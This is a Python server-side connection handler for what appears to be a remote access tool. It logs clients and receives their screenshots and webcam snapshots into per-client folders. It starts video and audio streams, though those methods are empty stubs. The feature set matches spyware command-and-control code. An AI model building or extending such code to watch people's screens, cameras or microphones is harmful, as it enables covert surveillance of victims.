import asyncore
import os
import threading
import datetime

CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))

BUFFER_SNAPSHOT = 609600
BUFFER_DEFAULT = 8096
ENCODING = "Cp1252"

WEBCAM_SCRIPT = "wb.py"
MICROPHONE_SCRIPT = "mic.py"

WEBCAM_DIR_FMT = "wb{client_id}"
SCREENSHOT_DIR_FMT = "ss{client_id}"

SNAPSHOT_NAME_FMT = "snap{num}.png"
SCREENSHOT_NAME_FMT = "ss_{client_id}_{num}.png"

DATA_TAKEN_SCREENSHOT = "TS"
DATA_TAKEN_SNAPSHOT = "SS"
DATA_START_LIVESTREAM = "VL"
DATA_START_AUDIOSTREAM = "VA"

CONNECTION_DISCONNECT_TEMPLATE = "[{time}] Client {addr} disconnected"
CONNECTION_LOST_TEMPLATE = "[{time}] Client {addr} lost connection"

def ts():
    return datetime.datetime.now().strftime("%H:%M:%S")

class ConnectionHandler(asyncore.dispatcher_with_send):
    receiving_screenshot = False
    receiving_snapshot = False

    def __init__(self, sock, addr, window, iD, connections):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.addr = addr
        self._connections = connections
        self._service_handlers = []
        self._encryption_handler = None

    def handle_read(self):
        global CURRENT_FOLDER
        data = self.recv(BUFFER_DEFAULT).decode(ENCODING)
        if data == DATA_TAKEN_SCREENSHOT:
            ConnectionHandler.receiving_screenshot = True
        if data == DATA_TAKEN_SNAPSHOT:
            ConnectionHandler.receiving_snapshot = True
        elif data == DATA_START_LIVESTREAM:
            video_thread = threading.Thread(target=ConnectionHandler.video_stream)
            video_thread.start()
        elif data == DATA_START_AUDIOSTREAM:
            audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
            audio_thread.start()
        elif data != "":
            self.window.Output.addItem(f"{ts()} {data}")

    def handle_close(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONNECTION_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        try:
            self.close()
        finally:
            self._connections.pop(self.id, None)
            self.window.Output.addItem(CONNECTION_LOST_TEMPLATE.format(time=ts(), addr=self.addr))

    @staticmethod
    def video_stream():
        return

    @staticmethod
    def audio_stream():
        return
